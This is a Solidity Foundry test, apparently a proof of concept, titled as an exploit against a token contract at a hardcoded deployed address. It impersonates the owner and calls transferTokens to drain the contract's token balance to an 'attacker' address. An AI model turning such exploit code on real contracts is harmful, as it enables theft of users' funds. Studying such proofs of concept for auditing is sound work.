pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Note: The original IERC20 interface was removed as it's redundant.
// The IxenoX interface has been expanded to include all necessary functions.
interface IxenoX {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transferTokens(address recepient, uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);
    IxenoX public target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IxenoX(TARGET);

        // Note: The `deal()` call was removed because the test logic
        // correctly seeds the contract with tokens using its own transfer function.
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        address owner = target.owner();

        // We need to establish the precondition (contract holding tokens) using its own
        // transfer logic, as `deal()` does not update the internal `_rOwned` balance correctly.
        // The owner has the initial supply, so we'll use them.
        uint256 amountToSeed = 1_000_000 * 1e9;

        vm.startPrank(owner);

        // 1. Transfer tokens from the owner to the contract. This is a fee-less transaction
        // because both owner and contract are excluded, and it correctly updates internal state.
        target.transfer(address(target), amountToSeed);

        // 2. Get the actual balance now held by the contract.
        uint256 contractBalance = target.balanceOf(address(target));
        assertTrue(contractBalance > 0, "Contract should have a token balance after transfer");

        // 3. Disable the swapAndLiquify feature. This is critical to prevent a revert/
        // timeout when the contract tries to interact with a non-liquid PancakeSwap pair.
        target.setSwapAndLiquifyEnabled(false);

        // 4. Execute the exploit: drain the tokens from the contract to the attacker.
        target.transferTokens(attacker, contractBalance);

        vm.stopPrank();

        // 5. Verify the attacker has received the funds.
        uint256 finalAttackerBalance = target.balanceOf(attacker);
        assertEq(finalAttackerBalance, contractBalance, "Attacker should have received the full contract balance");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

